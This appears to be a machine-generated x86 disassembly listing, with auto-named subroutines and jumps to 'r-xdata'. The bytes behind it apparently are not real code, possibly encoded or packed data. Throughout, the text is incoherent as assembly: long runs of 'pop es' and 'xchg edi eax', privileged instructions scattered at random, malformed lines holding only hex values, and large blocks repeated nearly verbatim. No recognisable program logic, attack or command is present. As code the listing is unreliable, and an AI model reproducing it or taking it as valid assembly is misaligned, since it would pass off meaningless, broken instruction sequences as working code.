pop es
int1
push ds
shl [ edi + 0x7e ] cl
test [ eax + 0x7079797 ] esi
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x14 ] cl
shr [ ebx - 0x6d ] cl
cwde
and [ ebp + 0x1a ] dl
iretd
mov esp 0x7686866
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
and [ esi - 0x68628082 ] 0xffffff97
pop es
pop es
pop es
pop es
pop es
cwde
adc al [ ebx ]
sub_48bd43
adc [ edi + 0x7070797 ] 0x7
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x47 ] 0xc8
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sar [ esi - 0x65 ] 0xb2
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shl [ edi + 0x7e ] cl
test [ eax + 0x7079797 ] esi
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
shr [ ebx + 0x14 ] cl
shr [ ebx - 0x6d ] cl
cwde
and [ ebp + 0x1a ] dl
iretd
sub_48c528
push eax
xchg edi eax
xchg ebp eax
xchg edi eax
xchg esi eax
xchg edi eax
jle r-xdata
fcom [ edi + 0x6be66897 ]
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
std
out 0x7e eax
adc ebx ecx
xchg edi eax
xchg edi eax
push 0xb27e7fe2
ficom [ edi - 0x2f8f869 ]
jle r-xdata
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
jle r-xdata
push edi
jle r-xdata
imul edi [ esi + 0x7 ] 0x6b
push 0xa3d41c68
arpl [ eax + 0x68 ] bp
pop es
pop es
jg r-xdata
jg r-xdata
jle r-xdata
mov ss [ edi + 0x1a070797 ]
shr [ ebx + 0x7e ] cl
pop es
imul ebp [ eax + 0x68 ] 0x1c
aam 0xa3
xchg edi eax
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
call [ edi - 0x3b686879 ]
push 0x97971700
xchg edi eax
pop es
adc dl [ edi + 0x7e ]
stosb [ edi ]
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
xchg edi eax
jle r-xdata
mov dh 0x97
pop es
pop es
pop es
pop es
mov dh 0x97
xchg edi eax
adc al 0x53
fwait
jle r-xdata
jle r-xdata
iretd
xchg edi eax
pop es
pop es
std
pop es
pop es
pop es
jle r-xdata
fst [ edi + 0x7e89fd97 ]
pop ecx
fcom [ edi - 0x3bf8f869 ]
std
xchg ebp eax
pop es
pop es
mov ebp 0x1ef19797
shr [ edi + 0x7e ] cl
out dx al
cmc
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
sbb al 0xd2
xchg [ edi + 0x7070797 ] dl
pop es
pop es
jle r-xdata
lahf
push 0xe87e87e2
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
cwde
adc eax [ ebx - 0x29 ]
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
push 0xd21c83e2
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
retn 0x7b1c
xchg edi eax
popad
push 0x7070768
pop es
pop es
pop es
cwde
and [ ebx + 0x28ed1ae6 ] al
jle r-xdata
mov bl 0x37
xchg ebp eax
xchg edi eax
xchg edi eax
sar [ esi - 0x38 ] 0xc7
xchg edi eax
xchg edi eax
pop es
pop es
pop esi
push esp
pop es
pop es
pop es
aad 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ch [ eax + 0x69 ]
push 0xb56e7e68
xchg edi eax
xchg edi eax
adc al 0x53
fwait
jle r-xdata
pop es
sbb dl [ ebx ]
pushad
push 0x1e070768
sar edi 0x1
sub_48c547
int1
push ds
shl [ ebx - 0x31 ] cl
jle r-xdata
sar [ esi + 0x12 ] 0x83
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
les edi [ edi + 0x36 ]
mov [ edi + 0x623cff97 ] edx
0x111ec4ab 0x976b
push 0x1c070768
shr [ ebx + 0x7e ] cl
js r-xdata
xchg edi eax
pop es
xchg edi eax
xchg edi eax
push 0x877e67e2
xchg esi eax
xchg edi eax
xchg edi eax
push eax
shl [ ebx ] cl
iretd
sub_48c567
stc
sar [ esi + 0x12 ] 0x83
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
les edi [ edi + 0x36 ]
mov [ edi + 0x623cff97 ] edx
0x111ec4ab 0x976b
sub_48c5f5
xor [ eax ] 0x14
imul esi [ edi - 0x7637ea68 ] 0x6a7e9797
leave
push 0x7070707
retn 0x7b1c
and [ edx + 0x1ac09797 ] ecx
sbb dl [ ebx ]
insb
push 0x1b121a68
push 0x68
push 0x979a297f
xchg edi eax
sbb al dl
jg r-xdata
pop es
pop es
pop es
pop es
jbe r-xdata
int1
push ds
0x1cc1fd6f 0x7e69
mov eax [ 0x6f149797 ]
xchg esi eax
jle r-xdata
pop es
pop es
pop es
pop ds

xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
mov [ edi + 0x7070797 ] edx
int1
push ds
rol [ edi + 0x1c ] cl
push ebp
jle r-xdata
pop es
pop es
pop es
pop es
jg r-xdata
mov [ edi - 0x7ee38069 ] dl
xchg edi eax
xchg edi eax
jle r-xdata
pop es
retn 0x537e
jns r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sar [ esi + 0x42 ] 0x6c
push 0x457ec868
pushad
push 0xfd070768
loope r-xdata
jo r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070707
[ eax - 0x69 ]
xchg edi eax
pop es
push 0x20980707
xchg ebx eax
aam 0x1c
xchg ebx eax
adc [ edx + edx * 8 - 0x58088161 ] dl
xchg edi eax
xchg edi eax
pop es
pop es
push 0x97977f00
xchg edi eax
jle r-xdata
push 0x7070707
pop es
sbb al 0xd2
outsd
jle r-xdata
mov eax 0x7079797
pop es
pop es
xchg [ edi - 0x2f8f869 ] edx
iretd
adc eax [ eax + 0x7e9797a5 ]
inc esp
mov al 0x97
xchg edi eax
pop es
pop es
push 0xc77e77e2
mov edx 0x7e079797
test [ ebp + 0x7079797 ] bh
pop es
pop es
pop es
les ebx [ esi ]
xchg ecx eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg [ edx ] ebx
rol [ edi + 0x7e ] cl
out dx eax
mov edi 0x7e079797
cmpsb [ esi ] [ edi ]
adc [ edi + 0x1e070797 ] 0xea
outsd
push 0x97971b01
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
insb
push 0x7070768
pop es
pop es
pop es
xlat
jle r-xdata
push 0x6bea1407
xchg ebx eax
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
salc
mov esp 0x297ec05f
rcl [ edi + 0x68fd0797 ] cl
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov dh 0xc4
movsb [ edi ] [ esi ]
dec esp
shr [ esp + ebp * 2 - 0x4882ec68 ] 0x97
xchg edi eax
fcom [ edi + 0x7ecf0797 ]
shr [ edi + 0x68 ] 0x1
scasb [ edi ]
0x7e9f
movsd [ edi ] [ esi ]
xchg edi eax
push 0x68
call [ edi + 0x689797a7 ]
loope r-xdata
iretd
xchg edi eax
xchg edi eax
jle r-xdata
jb r-xdata
push 0x4bd21ef1
jle r-xdata
std
push 0x686aa17e
mov esi 0x7079797
pop es
pop es
pop es
pop es
push 0x97975320
xchg edi eax
jle r-xdata
cwde
adc cl [ ebp + 0x7e979791 ]
cmp [ esi + 0x7079797 ] 0x7070707
push 0x6f1a1a07
push 0x68
push 0x97dd617e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
jmp r-xdata
lea edx [ ecx - 0x7e816869 ]
hlt
sub_48c66b
std
loopne r-xdata
pop edi
js r-xdata
aam 0x7c
push 0xff97fd68
mov bh dh
xlat
push 0x97975321
xchg edi eax
jle r-xdata
xchg [ edi + 0x777ed797 ] edx
jle r-xdata
push 0xca1e0768
pop edi
sar [ esi + 0x28 ] 0xb4
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
fisub [ edi + 0x7e ]
lodsd [ esi ]
mov esi 0x7079797
pop es
pop es
pop es
pop esi
push esp
push 0x5712c7c0
jle r-xdata
xchg [ bx - 0x2869 ] edx
jle r-xdata
xchg ebp eax
xchg edi eax
adc al 0x6f
pop es
pop es
pop es
jle r-xdata
mov eax 0x7079797
pop es
pop es
pop es
pop es
std
stc
sbb al 0x5f
jmp [ edi + 0x68 ]
push 0x7070768
pop es
retn 0x7b1c
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov dh 0xc4
movsb [ edi ] [ esi ]
dec esp
shr [ esp + ebp * 2 - 0x4882ec68 ] 0x97
xchg edi eax
outsd
push 0x7070768
pop es
sbb al 0x6f
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
int1
push ds
rol [ edi + 0x1c ] cl
push ebp
jle r-xdata
mov [ edi + 0x7070797 ] edx
pop es
retn 0x537e
jns r-xdata
int1
push ds
0x1cc1fd6f 0x7e69
xchg esi eax
jle r-xdata
mov eax [ 0x6f149797 ]
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070707
[ eax - 0x69 ]
push 0x7070707
pop es
sbb al 0xd2
outsd
jle r-xdata
mov eax 0x7079797
pop es
pop es
adc eax [ eax + 0x7e9797a5 ]
inc esp
mov al 0x97
xchg edi eax
pop es
pop es
push 0xc77e77e2
mov edx 0x7e079797
test [ ebp + 0x7079797 ] bh
pop es
pop es
pop es
les ebx [ esi ]
xchg ecx eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg [ edx ] ebx
rol [ edi + 0x7e ] cl
out dx eax
mov edi 0x7e079797
cmpsb [ esi ] [ edi ]
adc [ edi + 0x1e070797 ] 0xea
outsd
push 0x97971b01
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
insb
push 0x7070768
pop es
pop es
pop es
xlat
jle r-xdata
push 0x6bea1407
xchg ebx eax
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
salc
mov esp 0x297ec05f
rcl [ edi + 0x68fd0797 ] cl
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
jle r-xdata
xchg edi eax
fcom [ edi + 0x7ecf0797 ]
shr [ edi + 0x68 ] 0x1
scasb [ edi ]
0x7e9f
movsd [ edi ] [ esi ]
xchg edi eax
push 0x68
call [ edi + 0x689797a7 ]
loope r-xdata
iretd
xchg edi eax
xchg edi eax
jle r-xdata
jb r-xdata
push 0x4bd21ef1
jle r-xdata
std
push 0x686aa17e
mov esi 0x7079797
pop es
pop es
pop es
pop es
push 0x97975320
xchg edi eax
jle r-xdata
cwde
adc cl [ ebp + 0x7e979791 ]
cmp [ esi + 0x7079797 ] 0x7070707
push 0x6f1a1a07
push 0x68
push 0x97dd617e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
jmp r-xdata
lea edx [ ecx - 0x7e816869 ]
hlt
sub_48c785
adc [ esi + 0x7079797 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg [ edx ] ebx
rol [ edi + 0x7e ] cl
out dx eax
mov edi 0x7e079797
cmpsb [ esi ] [ edi ]
adc [ edi + 0x1e070797 ] 0xea
outsd
push 0x97971b01
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
pop es
push 0x6bea1407
xchg ebx eax
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
salc
mov esp 0x297ec05f
rcl [ edi + 0x68fd0797 ] cl
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc eax [ eax + 0x7e9797a5 ]
inc esp
mov al 0x97
xchg edi eax
pop es
pop es
push 0xc77e77e2
fcom [ edi + 0x7ecf0797 ]
shr [ edi + 0x68 ] 0x1
jle r-xdata
push 0x68
call [ edi + 0x689797a7 ]
loope r-xdata
iretd
xchg edi eax
xchg edi eax
jle r-xdata
jb r-xdata
push 0x4bd21ef1
jle r-xdata
std
push 0x686aa17e
mov esi 0x7079797
pop es
pop es
pop es
pop es
push 0x97975320
xchg edi eax
jle r-xdata
cwde
adc cl [ ebp + 0x7e979791 ]
cmp [ esi + 0x7079797 ] 0x7070707
push 0x6f1a1a07
push 0x68
push 0x97dd617e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
jmp r-xdata
lea edx [ ecx - 0x7e816869 ]
hlt
sub_48c92e
push edi
adc edx [ edi - 0x10816869 ]
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
push ds
shr [ edi + 0x7e ] cl
mov bl 0x97
xchg edi eax
pop es
pop es
pop es
sbb dl [ edx ]
inc ebx
push 0x68
push 0x2a1ec4c7
inc ebx
push 0x68
push 0x97ce697e
xchg edi eax
pop es
pop es
iretd
mov eax [ 0x7079797 ]
pop es
pop es
pop es
pop es
sub_48c96e
int1
push ds
shl [ ebp - 0x31 ] cl
int1
push ds
shl [ ebx + 0x7e ] cl
shl [ ecx + 0x7079797 ] 0x1c
imul edi [ edi - 0x2d ] 0x149797db
push ebx
fwait
stosb [ edi ]
idiv [ ebp - 0x69 ]
xchg edi eax
jle r-xdata
pop es
sbb al 0xdf
xchg ebx eax
jle r-xdata
jg r-xdata
pop es
pop es
pop es
jg r-xdata
stosb [ edi ]
xchg edi eax
xchg edi eax
push 0x97973b01
xchg edi eax
sbb dl dl
fist [ ebx - 0x68553d82 ]
push 0x5ecc0707
push esp
push 0x8a7e73e2
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
cwde
adc [ edx + 0x65 ] edi
into
xchg edi eax
xchg edi eax
pop es
pop es
iretd
jle r-xdata
adc ebx [ edi - 0x5a ]
mov ecx 0x397e9797
fst [ edi + 0x7070797 ]
pop es
pop es
jle r-xdata
xchg edi eax
xchg edi eax
sbb bl dl
push ebx
jle r-xdata
push 0x13985712
pop edi
cmpsb [ esi ] [ edi ]
sbb al 0x6e
jle r-xdata
int 0x97
xchg edi eax
pop es
adc al 0xf2
outsd
xchg edi eax
jle r-xdata
pop es
push 0x9487b3e3
push eax
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97ff0707
push 0x1a070768
fisubr [ ebx + 0x7e ]
and al 0xa5
xchg edi eax
xchg edi eax
sub [ ebx - 0x3f68686b ] bh
jle r-xdata
push edi
cwde
adc edi [ esi ]
leave
xchg edi eax
xchg edi eax
jle r-xdata
fist [ edi + 0x14070797 ]
push ebp
xchg ebp eax
mov ah [ esi + 0x11989797 ]
jpe r-xdata
retn
pop es
pop es
pop es
insd
push 0x7070768
adc eax [ ecx ]
push 0x8c7fc168
enter 0x9797 0xce
jle r-xdata
mov al [ 0x68079797 ]
jecxz r-xdata
pop es
pop es
sbb al 0x4f
push ebx
pop es
pop es
pop es
cmc
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x59
jle r-xdata
sar [ esi - 0x52 ] cl
not [ edi + 0x7070797 ]
pop es
pop es
jle r-xdata
push 0x83209868
out 0x7e al
cmp ebx [ esi + 0x7079797 ]
pop es
pop es
pop es
adc bl [ esi + 0x7e ]
xchg edx eax
bound ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd4
xchg [ edx ] edx
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
jle r-xdata
push 0xff070768
xchg edi eax
jle r-xdata
xchg [ eax + edx * 2 - 0x4c2ce339 ] edx
mov edi 0x97af6d7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
xchg esp eax
shl [ ebx - 0x74da8149 ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7e6b
adc [ edx + 0x7e ] esp
xor al 0x66
push 0x7e070768
dec ebx
outsd
push 0xb3ebae68
cmpsd [ esi ] [ edi ]
cwde
sub_48caf7
adc [ edi + 0xd7ece97 ] 0xdf
xchg edi eax
xchg edi eax
jg r-xdata
rcl [ edi + 0x6ff77e97 ] 0x68
push 0x7f957f07
push 0x7de97e68
push 0x1c070768
push ecx
jg r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
jne r-xdata
hlt
imul ebp [ eax + 0x68 ] 0x7
sbb dl dl
outsd
int1
push ds
push 0x985712ce
adc ecx [ eax + 0x69 ]
push 0x60aa7e68
push 0x7070768
pop es
pop es
pop es
cwde
adc edx [ edx ]
retn 0x9797
xchg edi eax
sbb al 0x56
pop esi
push esp
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x677e9be7
pushad
push 0xda1c0768
imul edi [ esi - 0x74 ] 0x6e
push 0x7070768
pop es
pop es
xchg esp eax
inc esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
enter 0x8d7e 0xab
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
lea edx [ edi + 0x6fc17e97 ]
push 0xc7c60768
push 0xc06873e2
mov edi [ esi - 0x2b ]
mov [ edi + 0x7ec70797 ] dl
pushad
lds edx [ edi + 0x5614c497 ]
xchg ebp eax
sar [ esi + 0x39 ] 0x9a
xchg edi eax
xchg edi eax
std
xchg edi eax
jle r-xdata
lahf
xchg edi eax
xchg edi eax
into
jle r-xdata
shr [ ebp - 0x5c ] cl
push edi
std
out dx eax
int1
push ds
shr [ ebx + 0x7e ] cl
adc ch al
xchg edi eax
xchg edi eax
pop es
pop es
std
stc
jle r-xdata
pop es
pop es
pop es
pop es
rcl [ edi + 0x5e561c97 ] 0x54
sbb bl [ edx ]
pop edi
push 0x68
push 0x97be267e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
into
adc dl [ edi - 0x68 ]
adc ah [ 0x7f68686e ]
in eax dx
rcl [ edi + 0x6e377e97 ] cl
jle r-xdata
push 0x7070768
pop es
pop es
pop es
jg r-xdata
aaa
outsb
rcr ebx 0x12
push edi
jle r-xdata
push 0x1e070707
mov ebx 0x7e979795
test [ ebp + 0x7079797 ] ecx
sbb al 0x51
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
push 0x7070768
pop es
fist [ edi + 0x7070797 ]
pop ds
shl [ edi ] cl
iretd

xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
rcl [ edi + 0x131a0797 ] cl
mov bl 0x3
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
daa
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
mov cl al
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push ds
adc [ ebx ] edx
xchg edi eax
xchg edi eax
xchg edi eax
jg r-xdata
rol edi 0x1
jle r-xdata
pop es
push ds
jle r-xdata
lea edx [ edi + 0x1c070797 ]
push ecx
retn 0x7b1c
adc dl [ edi + 0x7e ]
or ch [ edx + 0x7079797 ]
adc [ edi + 0x5b5aff97 ] 0xe3
push ecx
rcr [ esi ] 0x11
pop ds
sbb al 0x6f
jle r-xdata
pop es
jle r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x56
int1
push ds
ror [ edi + 0x7e ] cl
cmp esp [ edi + 0x68 ]
push 0x7070707
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push ds
adc [ edi ] ebx
jae r-xdata
pop es
push 0x97977f00
xchg edi eax
jle r-xdata
push 0x7070707
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
sbb al 0x7b
adc al 0x7b
test esp 0xce7ec0c1
mov ah 0x97
xchg edi eax
pop es
int1
push ds
ror [ ecx - 0x68595782 ] cl
xchg edi eax
pop es
pop es
pop es
cwde
adc esp [ ecx ]
mov ebx 0x5f1c9797
jle r-xdata
pop es
pop es
pop es
sbb dl dl
push 0xa0067ec7
xchg edi eax
xchg edi eax
pop es
std
clc
jle r-xdata
pop es
pop es
retn 0x9797
adc esi [ ebx - 0x686868f1 ]
lahf
xchg edi eax
xchg edi eax
pop es
cwde
adc al [ edx + ebp * 2 + 0x68 ]
push 0xfb7e57a4
jbe r-xdata
pop es
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi + 0x7e ]
jpe r-xdata
mov edi 0x93ff9797
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]
aaa
push 0x68
push 0x97c6a67e
xchg edi eax
pop es
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
enter 0x7d7e 0x79
push 0x247ec068
mov dh 0x97
scasb [ edi ]
shl [ ebx - 0x4cdd8171 ] cl
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
xchg edi eax
mov edx [ edi + 0x77016897 ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xc2
lahf
sbb dl [ edx ]
pop edi
push 0x68
push 0x97b65c7e
push 0xd57ec768
push 0x13986868
mov ebp 0xc168687d
jle r-xdata
add [ ebx - 0x69 ] esi
xchg edi eax
xchg edi eax
jle r-xdata
dec eax
push 0x97677e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
leave
jle r-xdata
rcl [ edi - 0x70813869 ] 0x1
push 0x7e7ece68
sahf
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
xchg edi eax
cwde
sbb ebp [ esi + 0x7e68686a ]
and ah bl
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
xchg edi eax
jno r-xdata
xchg edi eax
pop es
sbb dl [ edx ]
jecxz r-xdata
and al 0xb6
xchg edi eax
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97976b00
xchg edi eax
push 0x630068a1
xchg edi eax
xchg edi eax
xchg edi eax
push esp
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x827e
push ecx
shl [ ebx - 0x1d805860 ] cl
fst [ edi + 0x7070797 ]
jle r-xdata
push 0x8b7e541c
0x7079797 0x1407
mov bl 0xb3
xchg edi eax
sbb dl bl
mov bl 0xb3
pop es
sbb dl bl
mov bl 0xb8
mov edi 0x7079797
push 0x97973b01
xchg edi eax
call [ edi - 0x26868e9 ]
xchg edi eax
push 0x68b7b3e3
shl ebx 0x68
shl [ ebx - 0x30ff817d ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
adc edx edi
mov [ 0xffffffffd3fd9797 ] eax
sbb dl dl
aas
les edi [ esi - 0x2f ]
0x7079797 0x707
pop es
pop es
pop es
pop es
cwde
adc esp [ esi - 0x2686863 ]
xchg ebx eax
call [ edi - 0x3b686859 ]
jle r-xdata
fcom [ edi + 0x7f070797 ]
rcl al 0x1
xchg edi eax
sub_48cca7
std
xchg edi eax
push 0x5712dbc1
jle r-xdata
mov ebx 0x7e979795
test [ ebp + 0x7079797 ] ecx
sbb al 0x51
jle r-xdata
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
retn 0x7b1c
iretd

sub_48ccf5
pop es
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
xor edx [ esi + 0x7079797 ]
push 0x97977f00
xchg edi eax
jle r-xdata
aam 0x97
xchg edi eax
pop es
sbb al 0xd2
lahf
jle r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
sbb al 0x7b
mov ah 0x97
xchg edi eax
pop es
int1
push ds
ror [ ecx - 0x68595782 ] cl
xchg edi eax
pop es
pop es
pop es
cwde
adc esp [ ecx ]
mov ebx 0x5f1c9797
jle r-xdata
adc al 0x7b
test esp 0xce7ec0c1
iretd
adc esi [ ebx - 0x686868f1 ]
lahf
xchg edi eax
xchg edi eax
pop es
cwde
adc al [ edx + ebp * 2 + 0x68 ]
push 0xfb7e57a4
jbe r-xdata
pop es
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi + 0x7e ]
jpe r-xdata
mov edi 0x93ff9797
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]
aaa
push 0x68
push 0x97c6a67e
xchg edi eax
pop es
stosb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
enter 0x7d7e 0x79
push 0x247ec068
mov dh 0x97
scasb [ edi ]
shl [ ebx - 0x4cdd8171 ] cl
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
xchg edi eax
mov edx [ edi + 0x77016897 ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xc2
lahf
sbb dl [ edx ]
pop edi
push 0x68
push 0x97b65c7e
push 0xd57ec768
push 0x13986868
mov ebp 0xc168687d
jle r-xdata
add [ ebx - 0x69 ] esi
xchg edi eax
xchg edi eax
jle r-xdata
dec eax
push 0x97677e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
leave
jle r-xdata
rcl [ edi - 0x70813869 ] 0x1
push 0x7e7ece68
sahf
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
xchg edi eax
cwde
sbb ebp [ esi + 0x7e68686a ]
and ah bl
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
xchg edi eax
jno r-xdata
xchg edi eax
pop es
sbb dl [ edx ]
jecxz r-xdata
and al 0xb6
xchg edi eax
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97976b00
xchg edi eax
push 0x630068a1
xchg edi eax
xchg edi eax
xchg edi eax
push esp
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x827e
push ecx
shl [ ebx - 0x1d805860 ] cl
fst [ edi + 0x7070797 ]
jle r-xdata
push 0x8b7e541c
0x7079797 0x1407
mov bl 0xb3
xchg edi eax
sbb dl bl
mov bl 0xb3
pop es
sbb dl bl
mov bl 0xb8
mov edi 0x7079797
push 0x97973b01
xchg edi eax
call [ edi - 0x26868e9 ]
xchg edi eax
push 0x68b7b3e3
shl ebx 0x68
shl [ ebx - 0x30ff817d ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
adc edx edi
mov [ 0xffffffffd3fd9797 ] eax
sbb dl dl
aas
les edi [ esi - 0x2f ]
0x7079797 0x707
pop es
pop es
pop es
pop es
cwde
adc esp [ esi - 0x2686863 ]
xchg ebx eax
call [ edi - 0x3b686859 ]
jle r-xdata
fcom [ edi + 0x7f070797 ]
rcl al 0x1
xchg edi eax
sub_48cdad
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
push 0x97977301
xchg edi eax
jle r-xdata
and al 0xb6
xchg edi eax
xchg edi eax
pop es
sbb dl [ edx ]
jecxz r-xdata
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push 0x97976b00
xchg edi eax
push 0x630068a1
xchg edi eax
xchg edi eax
xchg edi eax
push esp
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x827e
pop edi
push 0x68
push 0x97b65c7e
push 0xd57ec768
push 0x13986868
mov ebp 0xc168687d
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
leave
jle r-xdata
rcl [ edi - 0x70813869 ] 0x1
push 0x7e7ece68
sahf
xchg edi eax
xchg edi eax
pop es
pop es
jle r-xdata
xchg edi eax
cwde
sbb ebp [ esi + 0x7e68686a ]
and ah bl
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
xchg edi eax
jno r-xdata
xchg edi eax
mov edx [ edi + 0x77016897 ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xc2
lahf
sbb dl [ edx ]
push ecx
shl [ ebx - 0x1d805860 ] cl
fst [ edi + 0x7070797 ]
jle r-xdata
push 0x8b7e541c
0x7079797 0x1407
mov bl 0xb3
xchg edi eax
sbb dl bl
mov bl 0xb3
pop es
sbb dl bl
mov bl 0xb8
mov edi 0x7079797
push 0x97973b01
xchg edi eax
call [ edi - 0x26868e9 ]
xchg edi eax
push 0x68b7b3e3
shl ebx 0x68
shl [ ebx - 0x30ff817d ] cl
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
adc edx edi
mov [ 0xffffffffd3fd9797 ] eax
sbb dl dl
aas
les edi [ esi - 0x2f ]
0x7079797 0x707
pop es
pop es
pop es
pop es
cwde
adc esp [ esi - 0x2686863 ]
xchg ebx eax
call [ edi - 0x3b686859 ]
jle r-xdata
fcom [ edi + 0x7f070797 ]
rcl al 0x1
xchg edi eax
sub_48ceef
xchg edi eax
xchg edi eax
adc al 0x53
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
ja r-xdata
pop es
pop es
pop es
pop es
pop es
sbb al 0x50
jle r-xdata
mov ebx 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
sbb al dl
dec ebx
jle r-xdata
push ss
jpo r-xdata
push 0x1a070707
shl [ ebx - 0x58813848 ] cl
